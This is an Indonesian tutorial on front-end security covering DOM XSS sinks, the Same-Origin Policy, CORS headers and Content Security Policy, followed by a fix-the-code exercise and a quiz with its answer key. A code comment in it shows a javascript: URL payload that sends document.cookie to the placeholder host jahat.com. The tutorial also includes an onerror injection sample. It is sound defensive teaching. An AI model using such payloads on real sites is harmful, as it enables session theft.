# Keamanan Front-End: Pencegahan DOM-Based XSS, CORS, dan Content Security Policy (CSP)

- **Tingkat:** Lanjut
- **Ringkasan:** Melindungi pengguna aplikasi web dari serangan *DOM-based Cross-Site Scripting (XSS)* dengan menghindari *sink* berbahaya (`innerHTML`, `eval`, URL `javascript:`), memahami mekanisme *Same-Origin Policy* dan *CORS*, serta menerapkan pertahanan berlapis dengan *Content Security Policy (CSP)*.

## Mengapa Kode Front-End Bisa Menjadi Pintu Masuk Penyerang?

Di sisi front-end, kode JavaScript Anda berjalan langsung di dalam peramban pengguna dengan hak akses penuh terhadap halaman tersebut: ia dapat membaca isi halaman, mengirim permintaan jaringan atas nama pengguna yang sedang login, dan mengubah tampilan formulir.

Jika kode JavaScript Anda mengambil teks yang tidak tepercaya—misalnya dari parameter URL (`location.search`), respons API yang memuat komentar pengguna lain, atau pesan lintas jendela—lalu memasukkannya secara mentah ke dalam DOM menggunakan metode yang mengeksekusi HTML/kode, maka terjadilah **DOM-Based Cross-Site Scripting (DOM XSS)**!

## 1. Sumber (*Sources*) dan Muara Berbahaya (*Dangerous Sinks*) pada DOM XSS

Untuk mencegah DOM XSS, pisahkan dengan tegas antara **Data Teks** dan **Kode yang Dieksekusi**:

| Muara Berbahaya (*Dangerous Sinks* — HINDARI untuk Data Pengguna!) | Alternatif yang Aman (*Safe Alternatives*) |
|---|---|
| `elemen.innerHTML = data` | **`elemen.textContent = data`** |
| `elemen.outerHTML = data` / `insertAdjacentHTML(..., data)` | **`document.createElement(...)`** + **`textContent`** + **`append()`** |
| `document.write(data)` | Jangan pernah gunakan `document.write()` di web modern! |
| `eval(data)` / `new Function(data)` | **`JSON.parse(data)`** untuk data JSON. |
| `setTimeout("kodeString", 100)` | Selalu kirimkan **fungsi** (`setTimeout(() => {...}, 100)`), bukan string! |
| `tautan.href = urlDariPengguna` | Validasi protokol URL terlebih dahulu dengan `new URL()` (pastikan hanya `https:` atau `http:`)! |

### Jebakan Berbahaya: XSS Lewat Atribut `href="javascript:..."`!
Banyak pengembang sudah patuh memakai `textContent` untuk teks tautan, tetapi lupa memvalidasi atribut **`href`** yang berasal dari input profil pengguna:

```js
// BAHAYA! Jika pengguna mengisi urlWebsite = "javascript:fetch('https://jahat.com/?c='+document.cookie)"
// maka saat pengguna lain mengeklik tautan tersebut, kode JavaScript jahat langsung dieksekusi!
tautanProfil.href = dataPengguna.urlWebsite;

// AMAN: Selalu validasi bahwa protokol URL hanya boleh 'https:' atau 'http:' menggunakan konstruktor URL!
function pasangTautanAman(elemenAnchor, inputUrl) {
  try {
    const urlTerurai = new URL(inputUrl);
    if (urlTerurai.protocol !== "https:" && urlTerurai.protocol !== "http:") {
      throw new Error("Protokol URL tidak diizinkan.");
    }
    elemenAnchor.href = urlTerurai.href;
    elemenAnchor.rel = "noopener noreferrer";
  } catch {
    elemenAnchor.removeAttribute("href");
  }
}
```

## 2. Memahami *Same-Origin Policy (SOP)* dan *CORS*

Pernahkah Anda memanggil `fetch("https://api-lain.com/data")` dari `http://localhost:8790` lalu melihat pesan galat merah di konsol:
`Access to fetch at 'https://api-lain.com/data' from origin 'http://localhost:8790' has been blocked by CORS policy`?

Penting untuk memahami **mengapa** peramban memiliki aturan ini:
1. **Apa itu *Origin*?** Dua URL memiliki *origin* yang sama **hanya jika ketiga komponen ini identik persis**: **Skema/Protokol** (`https`), **Host/Domain** (`kodeloka.asadinedu.com`), dan **Port** (`443`).
2. **Mengapa ada *Same-Origin Policy (SOP)*?** Bayangkan Anda sedang login ke bank Anda di satu tab, lalu di tab lain Anda tidak sengaja membuka situs berita palsu `jebakan.com`. Tanpa *Same-Origin Policy*, skrip di `jebakan.com` bisa diam-diam memanggil `fetch("https://bank-anda.com/api/saldo")` dan membaca seluruh isi rekening Anda! SOP mencegah situs A membaca balasan dari situs B.
3. **Apa itu CORS (*Cross-Origin Resource Sharing*)?** Ketika Anda memang memiliki arsitektur resmi di mana front-end di `https://app.contoh.id` perlu membaca data dari server API Anda di `https://api.contoh.id`, maka **server API (`api.contoh.id`)** harus menyertakan header HTTP respons yang mengizinkan origin tersebut:

```http
Access-Control-Allow-Origin: https://app.contoh.id
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
```

> **💡 Fakta Penting Debugging CORS:**
> Galat CORS **tidak bisa diperbaiki dengan mengubah kode `fetch()` di front-end**, karena kebijakan CORS ditegakkan oleh peramban berdasarkan **header HTTP yang dikirim oleh server tujuan** (atau melalui konfigurasi *reverse proxy* seperti Nginx di depan server).

## 3. Pertahanan Berlapis dengan *Content Security Policy (CSP)*

Bagaimana jika meskipun tim sudah berhati-hati, tetap ada satu celah XSS yang lolos di salah satu halaman?
Kita menerapkan pertahanan lapis kedua menggunakan header HTTP **Content Security Policy (`Content-Security-Policy`)** yang dikirim oleh server (seperti yang dikonfigurasi Kodeloka di berkas `_headers`):

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data: https:; object-src 'none'; base-uri 'self'; frame-ancestors 'none'
```

Dengan kebijakan CSP di atas:
- **`script-src 'self'`:** Peramban **hanya** mengizinkan eksekusi berkas `.js` yang dimuat dari domain situs itu sendiri (`'self'`).
- **Semua skrip inline gelap (`<script>...</script>` liar, `onclick="..."`, `onerror="..."`, dan `eval()`) otomatis diblokir oleh peramban!** Jadi meskipun penyerang berhasil menyuntikkan `<img src="x" onerror="curiData()">` ke halaman Anda, peramban menolak menjalankan kode `onerror` tersebut!

## Latihan Praktik: Mengaudit dan Memperbaiki Kode Front-End yang Rentan XSS

Perhatikan potongan kode berbahaya berikut:
```js
// KODE RENTAN:
const parameter = new URLSearchParams(window.location.search);
const nama = parameter.get("nama");
const situs = parameter.get("situs");
document.querySelector("#sapaan").innerHTML = `Selamat datang, <b>${nama}</b>! <a href="${situs}">Kunjungi profil</a>`;
```
Buatlah berkas `perbaikan-xss.js` yang menulis ulang logika di atas menggunakan `document.createElement`, `textContent`, dan fungsi validasi protokol `new URL()` sehingga 100% kebal terhadap suntikan `<script>` maupun URL `javascript:alert(1)`.

## Kuis Pemahaman

### Soal 1
Mengapa menyisipkan URL masukan pengguna ke dalam `<a href="...">` tetap berbahaya meskipun teks di dalam tautannya sudah diamankan menggunakan `textContent`?
- A. Karena atribut `href` dapat mengubah warna teks tautan.
- B. Karena pengguna jahat dapat memasukkan skema pseudo-protokol `javascript:kodeJahat()`, yang akan mengeksekusi kode JavaScript di dalam konteks halaman saat tautan tersebut diklik oleh pengguna lain.
- C. Karena `textContent` otomatis menghapus atribut `href`.
- D. Karena peramban akan langsung mengunduh berkas virus saat halaman dimuat.

**Jawaban Benar:** B
**Penjelasan:** Tautan dengan `href="javascript:..."` adalah vektor klasik serangan XSS. Selalu urai URL dari pengguna menggunakan `new URL(input)` dan pastikan `url.protocol` hanya bernilai `"https:"` atau `"http:"` sebelum memasangnya ke atribut `href`.

### Soal 2
Ketika kode `fetch("https://api.mitra.id/produk")` di halaman Anda ditolak oleh peramban dengan pesan galat kebijakan CORS (*blocked by CORS policy*), di manakah perbaikan yang benar harus dilakukan?
- A. Menambahkan `mode: "no-cors"` di front-end agar data JSON dapat dibaca oleh JavaScript.
- B. Mengonfigurasi server tujuan (`api.mitra.id`) agar menyertakan header HTTP `Access-Control-Allow-Origin` yang mengizinkan origin situs Anda (atau meneruskan permintaan melalui server backend/reverse proxy Anda sendiri).
- C. Mengganti `fetch()` dengan `XMLHttpRequest`.
- D. Menghapus tag `<!DOCTYPE html>` di halaman front-end.

**Jawaban Benar:** B
**Penjelasan:** Kebijakan CORS ditentukan oleh header respons dari server tujuan (`Access-Control-Allow-Origin`). Menambahkan `mode: "no-cors"` pada `fetch()` hanya menghasilkan respons *opaque* (buram) yang isi JSON-nya tetap tidak diizinkan untuk dibaca oleh kode JavaScript Anda.

### Soal 3
Bagaimana header HTTP `Content-Security-Policy: default-src 'self'; script-src 'self'` melindungi pengguna apabila terdapat celah injeksi HTML di halaman?
- A. Mengenkripsi seluruh isi `localStorage` dengan kata sandi.
- B. Menginstruksikan peramban untuk memblokir semua eksekusi skrip inline (seperti `<script>...</script>` suntikan atau atribut `onerror="..."`) serta menolak pemuatan skrip dari domain luar yang tidak terdaftar.
- C. Menghapus seluruh elemen `<form>` dari halaman.
- D. Mematikan koneksi internet pengguna.

**Jawaban Benar:** B
**Penjelasan:** Ketika direktif `script-src 'self'` diterapkan (tanpa `'unsafe-inline'`), peramban secara ketat menolak menjalankan skrip inline apa pun di dalam dokumen HTML maupun pemanggilan `eval()`, sehingga melumpuhkan sebagian besar muatan serangan XSS.

## Sumber
- [Cross Site Scripting Prevention Cheat Sheet — OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy (CSP) — MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)
- [`Content-Security-Policy` header — MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy)
